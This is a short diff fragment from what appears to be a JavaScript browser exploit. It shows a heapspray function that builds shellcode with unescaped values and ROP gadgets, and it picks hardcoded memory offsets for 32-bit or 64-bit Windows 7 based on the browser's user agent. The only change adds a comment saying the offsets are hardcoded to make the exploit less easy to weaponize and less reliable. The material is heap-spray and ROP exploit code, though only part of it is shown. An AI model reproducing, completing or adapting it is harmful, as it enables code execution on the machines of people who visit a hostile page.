@@ -163,7 +163,7 @@ function heapspray(cbuttonlayout) {
 	
 	if (navigator.userAgent.indexOf("WOW64") != -1 || navigator.userAgent.indexOf("Win64") != -1 )
    	shellcode+= unescape("%uffd8%u0001");			// offset goes into ebp for 64bit win7 base
-	else 
+	else 							// hardcoded offsets to make this exploit less easy to weopanize and less reliable
    	shellcode+= unescape("%u5360%u0004");			// offset goes into ebp for 32bit win7 base
 	
 	shellcode+= unescape("%u"+rop30+"%u"+rop31);	// add eax,ebp
